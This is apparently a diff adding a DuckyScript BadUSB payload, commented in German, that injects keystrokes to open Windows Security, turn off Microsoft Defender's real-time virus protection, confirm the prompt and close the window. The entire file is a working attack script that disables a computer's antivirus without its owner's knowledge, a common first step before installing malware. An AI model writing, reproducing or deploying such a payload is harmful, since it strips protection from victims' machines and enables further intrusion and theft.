@@ -1,0 +1,34 @@
+REM Author Christian Parushev
+REM Windows-Defender wird deaktiviert
+
+
+REM Windows-Sicherheit öffnen
+DELAY 1000
+GUI s
+DELAY 750
+STRING Windows-Sicherheit
+ENTER
+DELAY 200
+
+REM zu Viren- und Bedrohungsschutz und ausschalten
+ENTER
+DELAY 500
+ENTER
+DELAY 500
+TAB
+TAB
+TAB
+TAB
+DELAY 500
+ENTER
+DELAY 500
+REM Virenschutz deaktivieren
+SPACE
+DELAY 500
+REM Bestätigen mit linker Maustaste und Enter
+LEFTARROW
+ENTER
+DELAY 500
+REM Programm schließen
+ALT F4
+
